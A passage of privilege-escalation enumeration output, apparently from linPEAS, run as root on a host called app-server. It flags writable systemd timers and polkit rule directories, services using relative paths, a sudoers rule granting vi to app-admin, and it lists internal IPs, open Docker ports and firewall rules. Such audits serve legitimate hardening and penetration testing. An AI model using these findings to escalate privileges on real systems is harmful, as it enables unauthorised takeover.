Potential privilege escalation in timer file: /usr/lib/systemd/system/motd-news.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/phpsessionclean.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/plocate-updatedb.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/snapd.snap-repair.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/sysstat-collect.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/sysstat-summary.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/systemd-sysupdate-reboot.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/systemd-sysupdate.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/systemd-tmpfiles-clean.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/timers.target.wants/systemd-tmpfiles-clean.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/systemd-tmpfiles-clean.timer
Potential privilege escalation in timer file: /usr/lib/systemd/system/ua-timer.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/update-notifier-download.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/update-notifier-motd.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/system/xfs_scrub_all.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/user/launchpadlib-cache-clean.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /usr/lib/systemd/user/systemd-tmpfiles-clean.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/etc/systemd/system/timers.target.wants/apt-daily.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/apt-daily.timer
Potential privilege escalation in timer file: /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/etc/systemd/system/timers.target.wants/apt-daily-upgrade.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/apt-daily-upgrade.timer
Potential privilege escalation in timer file: /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/etc/systemd/system/timers.target.wants/dpkg-db-backup.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/dpkg-db-backup.timer
Potential privilege escalation in timer file: /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/etc/systemd/system/timers.target.wants/e2scrub_all.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/e2scrub_all.timer
Potential privilege escalation in timer file: /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/etc/systemd/system/timers.target.wants/fstrim.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/fstrim.timer
Potential privilege escalation in timer file: /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/lib/systemd/system/apt-daily.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/lib/systemd/system/apt-daily-upgrade.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/lib/systemd/system/dpkg-db-backup.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/lib/systemd/system/e2scrub_all.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/lib/systemd/system/fstrim.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/apt-daily.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/apt-daily-upgrade.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-backup.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/e2scrub_all.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/fstrim.timer
  └─ WRITABLE_FILE: Timer file is writable
Potential privilege escalation in timer file: /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/etc/systemd/system/timers.target.wants/apt-daily.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/apt-daily.timer
Potential privilege escalation in timer file: /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/etc/systemd/system/timers.target.wants/apt-daily-upgrade.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/apt-daily-upgrade.timer
Potential privilege escalation in timer file: /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/etc/systemd/system/timers.target.wants/dpkg-db-backup.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/dpkg-db-backup.timer
Potential privilege escalation in timer file: /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/etc/systemd/system/timers.target.wants/e2scrub_all.timer
  └─ WRITABLE_FILE: Timer target file is writable: /usr/lib/systemd/system/e2scrub_all.timer

╔══════════╣ Services and Service Files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services                                                                                                                                                  
                                                                                                                                                                                                                                            
══╣ Active services:
apparmor.service                                                                          loaded active exited  Load AppArmor profiles                                                                                                      
apport.service                                                                            loaded active exited  automatic crash report generation
blk-availability.service                                                                  loaded active exited  Availability of block devices
console-setup.service                                                                     loaded active exited  Set console font and keymap
containerd.service                                                                        loaded active running containerd container runtime
cron.service                                                                              loaded active running Regular background program processing daemon
dbus.service                                                                              loaded active running D-Bus System Message Bus
  Potential issue in service file: /usr/lib/systemd/system/dbus.service
  └─ RELATIVE_PATH: Could be executing some relative path
docker.service                                                                            loaded active running Docker Application Container Engine
finalrd.service                                                                           loaded active exited  Create final runtime dir for shutdown pivot root
getty@tty1.service                                                                        loaded active running Getty on tty1
keyboard-setup.service                                                                    loaded active exited  Set the console keyboard layout
kmod-static-nodes.service                                                                 loaded active exited  Create List of Static Device Nodes
lvm2-monitor.service                                                                      loaded active exited  Monitoring of LVM2 mirrors, snapshots etc. using dmeventd or progress polling
ModemManager.service                                                                      loaded active running Modem Manager
  Potential issue in service: ModemManager.service
  └─ RUNS_AS_ROOT: Service runs as root
multipathd.service                                                                        loaded active running Device-Mapper Multipath Device Controller
open-vm-tools.service                                                                     loaded active running Service for virtual machines hosted on VMware
plymouth-quit-wait.service                                                                loaded active exited  Hold until boot process finishes up
plymouth-quit.service                                                                     loaded active exited  Terminate Plymouth Boot Screen
plymouth-read-write.service                                                               loaded active exited  Tell Plymouth To Write Out Runtime Data
polkit.service                                                                            loaded active running Authorization Manager
rsyslog.service                                                                           loaded active running System Logging Service
setvtrgb.service                                                                          loaded active exited  Set console scheme
snapd.apparmor.service                                                                    loaded active exited  Load AppArmor profiles managed internally by snapd
snapd.seeded.service                                                                      loaded active exited  Wait until snapd is fully seeded
ssh.service                                                                               loaded active running OpenBSD Secure Shell server
sysstat.service                                                                           loaded active exited  Resets System Activity Logs
  Potential issue in service: sysstat.service
  └─ RUNS_AS_ROOT: Service runs as root
systemd-binfmt.service                                                                    loaded active exited  Set Up Additional Binary Formats
systemd-fsck@dev-disk-by\x2duuid-92c136ba\x2d6589\x2d4780\x2db944\x2d3cffb6d36bca.service loaded active exited  File System Check on /dev/disk/by-uuid/92c136ba-6589-4780-b944-3cffb6d36bca
systemd-fsck@dev-disk-by\x2duuid-C5A3\x2d52A5.service                                     loaded active exited  File System Check on /dev/disk/by-uuid/C5A3-52A5
systemd-journal-flush.service                                                             loaded active exited  Flush Journal to Persistent Storage
  Potential issue in service file: /usr/lib/systemd/system/systemd-journal-flush.service
  └─ RELATIVE_PATH: Could be executing some relative path
systemd-journald.service                                                                  loaded active running Journal Service
systemd-logind.service                                                                    loaded active running User Login Management
systemd-modules-load.service                                                              loaded active exited  Load Kernel Modules
systemd-networkd-wait-online.service                                                      loaded active exited  Wait for Network to be Configured
systemd-networkd.service                                                                  loaded active running Network Configuration
systemd-random-seed.service                                                               loaded active exited  Load/Save OS Random Seed
systemd-remount-fs.service                                                                loaded active exited  Remount Root and Kernel File Systems
  Potential issue in service: systemd-remount-fs.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands
systemd-resolved.service                                                                  loaded active running Network Name Resolution
systemd-sysctl.service                                                                    loaded active exited  Apply Kernel Variables
systemd-timesyncd.service                                                                 loaded active running Network Time Synchronization
systemd-tmpfiles-setup-dev-early.service                                                  loaded active exited  Create Static Device Nodes in /dev gracefully
systemd-tmpfiles-setup-dev.service                                                        loaded active exited  Create Static Device Nodes in /dev
systemd-tmpfiles-setup.service                                                            loaded active exited  Create Volatile Files and Directories
systemd-udev-trigger.service                                                              loaded active exited  Coldplug All udev Devices
  Potential issue in service file: /usr/lib/systemd/system/systemd-udev-trigger.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service: systemd-udev-trigger.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands
systemd-udevd.service                                                                     loaded active running Rule-based Manager for Device Events and Files
systemd-update-utmp.service                                                               loaded active exited  Record System Boot/Shutdown in UTMP
systemd-user-sessions.service                                                             loaded active exited  Permit User Sessions
ubuntu-fan.service                                                                        loaded active exited  Ubuntu FAN network setup
udisks2.service                                                                           loaded active running Disk Manager
ufw.service                                                                               loaded active exited  Uncomplicated firewall
unattended-upgrades.service                                                               loaded active running Unattended Upgrades Shutdown
upower.service                                                                            loaded active running Daemon for power management
user-runtime-dir@1000.service                                                             loaded active exited  User Runtime Directory /run/user/1000
user@1000.service                                                                         loaded active running User Manager for UID 1000
vgauth.service                                                                            loaded active running Authentication service for virtual machines hosted on VMware
Legend: LOAD   → Reflects whether the unit definition was properly loaded.
ACTIVE → The high-level unit activation state, i.e. generalization of SUB.
SUB    → The low-level unit activation state, values depend on unit type.
55 loaded units listed.

══╣ Disabled services:
console-getty.service                        disabled disabled                                                                                                                                                                              
debug-shell.service                          disabled disabled
iscsid.service                               disabled enabled
nftables.service                             disabled enabled
rsync.service                                disabled enabled
serial-getty@.service                        disabled enabled
ssh.service                                  disabled enabled
systemd-boot-check-no-failures.service       disabled disabled
systemd-confext.service                      disabled enabled
  Potential issue in service file: /usr/lib/systemd/system/systemd-confext.service
  └─ RELATIVE_PATH: Could be executing some relative path
systemd-network-generator.service            disabled enabled
systemd-networkd-wait-online@.service        disabled enabled
systemd-pcrlock-file-system.service          disabled enabled
systemd-pcrlock-firmware-code.service        disabled enabled
systemd-pcrlock-firmware-config.service      disabled enabled
systemd-pcrlock-machine-id.service           disabled enabled
systemd-pcrlock-make-policy.service          disabled enabled
systemd-pcrlock-secureboot-authority.service disabled enabled
systemd-pcrlock-secureboot-policy.service    disabled enabled
systemd-sysext.service                       disabled enabled
  Potential issue in service file: /usr/lib/systemd/system/systemd-sysext.service
  └─ RELATIVE_PATH: Could be executing some relative path
systemd-time-wait-sync.service               disabled disabled
upower.service                               disabled enabled
21 unit files listed.

══╣ Additional service files:
  Potential issue in service file: /etc/systemd/system/hibernate.target.wants/grub-common.service                                                                                                                                           
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service file: /etc/systemd/system/hybrid-sleep.target.wants/grub-common.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service file: /etc/systemd/system/multi-user.target.wants/grub-common.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service file: /etc/systemd/system/suspend.target.wants/grub-common.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service file: /etc/systemd/system/suspend-then-hibernate.target.wants/grub-common.service
  └─ RELATIVE_PATH: Could be executing some relative path
You can't write on systemd PATH

╔══════════╣ Systemd Information
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                                                                                                             
═╣ Systemd version and vulnerabilities? .............. 255.4                                                                                                                                                                                
8.5
═╣ Services running as root? ..... 
═╣ Running services with dangerous capabilities? ... 
═╣ Services with writable paths? . containerd.service: Uses relative path 'overlay' (from ExecStartPre=-/sbin/modprobe overlay)
dbus.service: Uses relative path '@dbus-daemon' (from ExecStart=@/usr/bin/dbus-daemon @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only)
multipathd.service: Uses relative path 'dm-multipath' (from ExecStartPre=-/sbin/modprobe dm-multipath)
rsyslog.service: Uses relative path '-n' (from ExecStart=/usr/sbin/rsyslogd -n -iNONE)

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                                                                                                             
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin                                                                                                                                                                            

╔══════════╣ D-Bus Analysis
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                                                                                                                     
NAME                            PID PROCESS         USER             CONNECTION    UNIT                        SESSION DESCRIPTION                                                                                                          
:1.0                            631 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service   -       -
:1.1                            585 systemd-network systemd-network  :1.1          systemd-networkd.service    -       -
:1.17                          1846 systemd         app-admin        :1.17         user@1000.service           -       -
:1.2                            615 systemd-resolve systemd-resolve  :1.2          systemd-resolved.service    -       -
:1.24                          2324 upowerd         root             :1.24         upower.service              -       -
:1.3                              1 systemd         root             :1.3          init.scope                  -       -
:1.4                            911 udisksd         root             :1.4          udisks2.service             -       -
:1.5                            904 systemd-logind  root             :1.5          systemd-logind.service      -       -
:1.6                            857 polkitd         polkitd          :1.6          polkit.service              -       -
:1.7                           1004 ModemManager    root             :1.7          ModemManager.service        -       -
:1.8                            956 unattended-upgr root             :1.8          unattended-upgrades.service -       -
:1.82                         80278 busctl          root             :1.82         session-150.scope           150     -
com.ubuntu.SoftwareProperties     - -               -                (activatable) -                           -       -
io.netplan.Netplan                - -               -                (activatable) -                           -       -
org.freedesktop.DBus              1 systemd         root             -             init.scope                  -       -
org.freedesktop.ModemManager1  1004 ModemManager    root             :1.7          ModemManager.service        -       -
org.freedesktop.PackageKit        - -               -                (activatable) -                           -       -
org.freedesktop.PolicyKit1      857 polkitd         polkitd          :1.6          polkit.service              -       -
org.freedesktop.UDisks2         911 udisksd         root             :1.4          udisks2.service             -       -
org.freedesktop.UPower         2324 upowerd         root             :1.24         upower.service              -       -
org.freedesktop.bolt              - -               -                (activatable) -                           -       -
org.freedesktop.fwupd             - -               -                (activatable) -                           -       -
org.freedesktop.hostname1         - -               -                (activatable) -                           -       -
org.freedesktop.locale1           - -               -                (activatable) -                           -       -
org.freedesktop.login1          904 systemd-logind  root             :1.5          systemd-logind.service      -       -
org.freedesktop.network1        585 systemd-network systemd-network  :1.1          systemd-networkd.service    -       -
org.freedesktop.resolve1        615 systemd-resolve systemd-resolve  :1.2          systemd-resolved.service    -       -
org.freedesktop.systemd1          1 systemd         root             :1.3          init.scope                  -       -
org.freedesktop.thermald          - -               -                (activatable) -                           -       -
org.freedesktop.timedate1         - -               -                (activatable) -                           -       -
org.freedesktop.timesync1       631 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service   -       -

╔══════════╣ D-Bus Configuration Files
Analyzing /etc/dbus-1/system.d/com.ubuntu.SoftwareProperties.conf:                                                                                                                                                                          
  └─(Allow rules in default context)
             └─     <allow send_destination="com.ubuntu.SoftwareProperties"
            <allow send_destination="com.ubuntu.SoftwareProperties"
            <allow send_destination="com.ubuntu.DeviceDriver"

══╣ D-Bus Session Bus Analysis
(Access to session bus available)                                                                                                                                                                                                           




                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                                                                                                         
                              ╚═════════════════════╝                                                                                                                                                                                       
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                                                                                         
link-local 169.254.0.0
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:a6ff:fed5:f50f  prefixlen 64  scopeid 0x20<link>
        ether 02:42:a6:d5:f5:0f  txqueuelen 0  (Ethernet)
        RX packets 1037537  bytes 1115558449 (1.1 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1116026  bytes 117828190 (117.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens32: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.26.10.11  netmask 255.255.255.0  broadcast 172.26.10.255
        inet6 fe80::250:56ff:fe96:6b08  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:96:6b:08  txqueuelen 1000  (Ethernet)
        RX packets 1210704  bytes 124918347 (124.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1488831  bytes 1160274183 (1.1 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 24668  bytes 1754580 (1.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24668  bytes 1754580 (1.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth2c80ddd: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::8c0b:9fff:fea6:123e  prefixlen 64  scopeid 0x20<link>
        ether 8e:0b:9f:a6:12:3e  txqueuelen 0  (Ethernet)
        RX packets 231943  bytes 30797862 (30.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 231997  bytes 20321010 (20.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth5e08161: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::8035:33ff:fe99:65d3  prefixlen 64  scopeid 0x20<link>
        ether 82:35:33:99:65:d3  txqueuelen 0  (Ethernet)
        RX packets 804228  bytes 1095776074 (1.0 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 883133  bytes 97440456 (97.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Hostname, hosts and DNS
══╣ Hostname Information                                                                                                                                                                                                                    
System hostname: app-server                                                                                                                                                                                                                 
FQDN: app-server

══╣ Hosts File Information
Contents of /etc/hosts:                                                                                                                                                                                                                     
  127.0.0.1 localhost
  127.0.1.1 app-server
  ::1     ip6-localhost ip6-loopback
  fe00::0 ip6-localnet
  ff00::0 ip6-mcastprefix
  ff02::1 ip6-allnodes
  ff02::2 ip6-allrouters

══╣ DNS Configuration
DNS Servers (resolv.conf):                                                                                                                                                                                                                  
  127.0.0.53
  search .
-e 
Systemd-resolved configuration:
  [Resolve]
-e 
NetworkManager DNS settings:
-e 
DNS Domain Information:
(none)

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                                                                                                
══╣ Active Ports (netstat)                                                                                                                                                                                                                  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      615/systemd-resolve                                                                                                                                         
tcp        0      0 0.0.0.0:8091            0.0.0.0:*               LISTEN      5083/docker-proxy   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      615/systemd-resolve 
tcp        0      0 127.0.0.1:45383         0.0.0.0:*               LISTEN      952/containerd      
tcp        0      0 0.0.0.0:23100           0.0.0.0:*               LISTEN      5215/docker-proxy   
tcp6       0      0 :::8091                 :::*                    LISTEN      5092/docker-proxy   
tcp6       0      0 :::22                   :::*                    LISTEN      1/init              
tcp6       0      0 :::23100                :::*                    LISTEN      5221/docker-proxy   

╔══════════╣ Network Traffic Analysis Capabilities
                                                                                                                                                                                                                                            
══╣ Available Sniffing Tools
tcpdump is available                                                                                                                                                                                                                        
tcpdump version 4.99.4

══╣ Network Interfaces Sniffing Capabilities
Interface ens32: Not sniffable                                                                                                                                                                                                              
Interface docker0: Not sniffable
Interface veth5e08161@if20: Not sniffable
Interface veth2c80ddd@if22: Not sniffable
No sniffable interfaces found

╔══════════╣ Firewall Rules Analysis
                                                                                                                                                                                                                                            
══╣ Iptables Rules
No permission to list iptables rules                                                                                                                                                                                                        

══╣ Nftables Rules
nftables v1.0.9 (Old Doc Yak #3)                                                                                                                                                                                                            
-e 
Nftables Ruleset:
table ip nat {
        chain DOCKER {
                iifname "docker0" counter packets 0 bytes 0 return
                iifname != "docker0" tcp dport 8091 counter packets 34242 bytes 2056068 dnat to 172.17.0.2:8091
                iifname != "docker0" tcp dport 23100 counter packets 46371 bytes 2782256 dnat to 172.17.0.3:23100
        }

        chain POSTROUTING {
                type nat hook postrouting priority srcnat; policy accept;
                ip saddr 172.17.0.0/16 oifname != "docker0" counter packets 0 bytes 0 masquerade
                ip saddr 172.17.0.2 ip daddr 172.17.0.2 tcp dport 8091 counter packets 0 bytes 0 masquerade
                ip saddr 172.17.0.3 ip daddr 172.17.0.3 tcp dport 23100 counter packets 0 bytes 0 masquerade
        }

        chain PREROUTING {
                type nat hook prerouting priority dstnat; policy accept;
                fib daddr type local counter packets 162028 bytes 8421088 jump DOCKER
        }

        chain OUTPUT {
                type nat hook output priority dstnat; policy accept;
                ip daddr != 127.0.0.0/8 fib daddr type local counter packets 0 bytes 0 jump DOCKER
        }
}
table ip filter {
        chain DOCKER {
                ip daddr 172.17.0.2 iifname != "docker0" oifname "docker0" tcp dport 8091 counter packets 34242 bytes 2056068 accept
                ip daddr 172.17.0.3 iifname != "docker0" oifname "docker0" tcp dport 23100 counter packets 46371 bytes 2782256 accept
        }

        chain DOCKER-ISOLATION-STAGE-1 {
                iifname "docker0" oifname != "docker0" counter packets 1037318 bytes 1115552317 jump DOCKER-ISOLATION-STAGE-2
                counter packets 2153118 bytes 1217749363 return
        }

        chain DOCKER-ISOLATION-STAGE-2 {
                oifname "docker0" counter packets 0 bytes 0 drop
                counter packets 1037318 bytes 1115552317 return
        }

        chain FORWARD {
                type filter hook forward priority filter; policy drop;
                counter packets 2153118 bytes 1217749363 jump DOCKER-USER
                counter packets 2153118 bytes 1217749363 jump DOCKER-ISOLATION-STAGE-1
                oifname "docker0" ct state related,established counter packets 1035172 bytes 97357762 accept
                oifname "docker0" counter packets 80628 bytes 4839284 jump DOCKER
                iifname "docker0" oifname != "docker0" counter packets 1037318 bytes 1115552317 accept
                iifname "docker0" oifname "docker0" counter packets 0 bytes 0 accept
        }

        chain DOCKER-USER {
                counter packets 2153118 bytes 1217749363 return
        }
}
-e 
Saved Rules:
Found rules in /etc/nftables.conf:

flush ruleset

table inet filter {
        chain input {
                type filter hook input priority filter;
        }
        chain forward {
                type filter hook forward priority filter;
        }
        chain output {
                type filter hook output priority filter;
        }
}

══╣ Firewalld Rules
firewalld Not Found                                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
══╣ UFW Rules
ufw 0.36.2                                                                                                                                                                                                                                  
Copyright 2008-2023 Canonical Ltd.
-e 
UFW Rules:
Status: inactive
-e 
Numbered Rules:
Status: inactive

╔══════════╣ Inetd/Xinetd Services Analysis
                                                                                                                                                                                                                                            
══╣ Inetd Services
inetd Not Found                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
══╣ Xinetd Services
xinetd Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
══╣ Running Inetd/Xinetd Services
Active Services (from netstat):                                                                                                                                                                                                             
-e 
Active Services (from ss):
-e 
Running Service Processes:

╔══════════╣ Internet Access?
Port 80 is not accessible                                                                                                                                                                                                                   
Port 443 is not accessible
DNS is not accessible
ICMP is not accessible
Port 443 is not accessible with curl



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users                                                                                                                                                     
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                                                                      

╔══════════╣ PGP Keys and Related Files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#pgp-keys                                                                                                                                                  
GPG:                                                                                                                                                                                                                                        
GPG is installed, listing keys:
-e 
NetPGP:
netpgpkeys Not Found
-e                                                                                                                                                                                                                                          
PGP Related Files:
Found: /root/.gnupg
total 16
drwx------ 2 root root 4096 Jul 19 09:22 .
drwx------ 8 root root 4096 Jul 19 09:22 ..
-rw------- 1 root root   32 Jul 19 09:22 pubring.kbx
-rw------- 1 root root 1200 Jul 19 09:22 trustdb.gpg

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
Matching Defaults entries for root on app-server:                                                                                                                                                                                           
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User root may run the following commands on app-server:
    (ALL : ALL) ALL
/etc/sudoers:Defaults   env_reset
/etc/sudoers:Defaults   mail_badpass
/etc/sudoers:Defaults   secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
/etc/sudoers:Defaults   use_pty
/etc/sudoers:root       ALL=(ALL:ALL) ALL
/etc/sudoers:%admin ALL=(ALL) ALL
/etc/sudoers:%sudo      ALL=(ALL:ALL) ALL
/etc/sudoers:@includedir /etc/sudoers.d
Sudoers file: /etc/sudoers.d/README is readable
Sudoers file: /etc/sudoers.d/app-admin-vi is readable
app-admin ALL=(ALL) /usr/bin/vi


╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens                                                                                                                                       
ptrace protection is enabled (1)                                                                                                                                                                                                            

doas.conf Not Found
                                                                                                                                                                                                                                            
╔══════════╣ Checking Pkexec and Polkit
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2                                                                                                                 
                                                                                                                                                                                                                                            
══╣ Polkit Binary
                                                                                                                                                                                                                                            
══╣ Polkit Policies
Checking /etc/polkit-1/rules.d/:                                                                                                                                                                                                            
WARNING: /etc/polkit-1/rules.d/ is writable!
Checking /usr/share/polkit-1/rules.d/:
WARNING: /usr/share/polkit-1/rules.d/ is writable!
WARNING: /usr/share/polkit-1/rules.d//49-ubuntu-admin.rules is writable!
polkit.addAdminRule(function(action, subject) {
    return ["unix-group:sudo", "unix-group:admin"];
});
WARNING: /usr/share/polkit-1/rules.d//50-default.rules is writable!
/* -*- mode: js; js-indent-level: 4; indent-tabs-mode: nil -*- */

// DO NOT EDIT THIS FILE, it will be overwritten on update
//
// Default rules for polkit
//
// See the polkit(8) man page for more information
// about configuring polkit.

polkit.addAdminRule(function(action, subject) {
    return ["unix-group:sudo"];
});
WARNING: /usr/share/polkit-1/rules.d//org.freedesktop.bolt.rules is writable!
// -*- mode: js2 -*-
polkit.addRule(function(action, subject) {
    if ((action.id === "org.freedesktop.bolt.enroll" ||
         action.id === "org.freedesktop.bolt.authorize" ||
